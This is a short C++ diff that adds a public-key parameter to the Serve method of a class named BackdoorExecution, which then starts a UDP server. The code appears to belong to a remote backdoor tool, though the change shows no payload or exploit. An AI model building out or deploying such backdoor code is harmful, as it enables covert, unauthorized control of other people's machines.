@@ -4,8 +4,9 @@
 #include <iostream>
 
 
-void BackdoorExecution::Serve(volatile std::sig_atomic_t& stop, std::uint16_t port)
+void BackdoorExecution::Serve(volatile std::sig_atomic_t& stop, std::uint16_t port, boost::multiprecision::cpp_int public_key)
 {
+    m_public_key = std::move(public_key);
     UdpServer::Serve(stop, port);
 }
 
